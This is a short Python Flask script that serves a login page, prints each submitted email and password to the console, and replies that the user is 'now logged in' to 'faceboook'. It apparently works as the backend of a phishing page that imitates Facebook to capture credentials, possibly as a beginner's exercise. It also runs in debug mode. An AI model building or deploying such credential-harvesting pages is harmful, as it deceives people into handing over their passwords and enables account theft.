from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=["GET","POST"])
def hello_world():
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]
        print(f"The name is {email} and the password is {password}")
        return "<b> Thanks for using faceboook. you are now logged in </b>"
    return render_template("index.html")

app.run(debug=True)